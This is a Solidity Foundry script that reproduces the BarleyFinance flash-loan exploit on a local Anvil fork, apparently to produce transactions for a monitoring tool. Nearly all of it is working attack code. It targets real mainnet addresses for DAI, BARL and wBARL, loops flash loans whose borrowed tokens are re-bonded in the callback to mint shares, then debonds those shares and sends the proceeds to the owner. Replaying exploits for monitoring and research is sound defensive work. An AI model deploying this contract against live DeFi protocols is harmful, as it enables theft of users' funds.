// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Script.sol";
import "../src/test/interface.sol";

// ============================================================================
// BarleyFinance Attack Script (for Monitor analysis)
// ============================================================================
//
// This script creates ACTUAL blockchain transactions (unlike forge test)
// that can be traced with debug_traceTransaction for Monitor analysis
//
// Usage:
//   1. Start Anvil in fork mode
//   2. Run: forge script script/BarleyFinance_attack.s.sol:BarleyAttack --rpc-url http://localhost:8545 --broadcast
//   3. Extract transaction hash from output
//   4. Analyze with Monitor: ./autopath/monitor -rpc http://localhost:8545 -tx <TX_HASH>
// ============================================================================

interface IwBARL is IERC20 {
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

contract AttackExecutor {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IwBARL private constant wBARL = IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);

    uint256 constant LOOP_COUNT = 20;
    uint256 constant DAI_PER_LOOP = 10e18;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function executeAttack() external {
        require(msg.sender == owner, "Not owner");

        // Execute flash + bond loop
        uint8 i;
        while (i < LOOP_COUNT) {
            DAI.approve(address(wBARL), DAI_PER_LOOP);

            uint256 flashAmount = BARL.balanceOf(address(wBARL));
            wBARL.flash(address(this), address(BARL), flashAmount, "");

            ++i;
        }

        // Withdraw all wBARL shares
        uint256 shareBalance = wBARL.balanceOf(address(this));

        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;

        wBARL.debond(shareBalance, token, percentage);

        // Transfer all BARL back to owner
        uint256 barlBalance = BARL.balanceOf(address(this));
        BARL.transfer(owner, barlBalance);
    }

    // Flash callback
    function callback(bytes calldata) external {
        uint256 barlBalance = BARL.balanceOf(address(this));
        BARL.approve(address(wBARL), barlBalance);
        wBARL.bond(address(BARL), barlBalance);
    }
}

contract BarleyAttack is Script {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);

    function run() external {
        // Use Anvil's default funded account
        uint256 deployerPrivateKey = vm.envOr("PRIVATE_KEY", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));

        vm.startBroadcast(deployerPrivateKey);

        console.log("========================================");
        console.log("BarleyFinance Attack Script");
        console.log("========================================");
        console.log("Deployer:", vm.addr(deployerPrivateKey));

        // Step 1: Deploy attack contract
        console.log("\n[1/3] Deploying attack contract...");
        AttackExecutor attacker = new AttackExecutor();
        console.log("  Attack contract:", address(attacker));

        // Step 2: Fund attack contract with DAI
        console.log("\n[2/3] Funding attack contract...");
        // Use a DAI-rich address (Binance hot wallet)
        address daiWhale = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

        vm.stopBroadcast();
        vm.startPrank(daiWhale);
        DAI.transfer(address(attacker), 200e18);
        vm.stopPrank();
        vm.startBroadcast(deployerPrivateKey);

        console.log("  Transferred 200 DAI to attack contract");

        // Step 3: Execute attack
        console.log("\n[3/3] Executing attack...");
        attacker.executeAttack();
        console.log("  Attack completed!");

        // Show results
        uint256 barlBalance = BARL.balanceOf(vm.addr(deployerPrivateKey));
        console.log("\n========================================");
        console.log("Final BARL balance:", barlBalance / 1e18, "BARL");
        console.log("========================================");

        vm.stopBroadcast();
    }
}
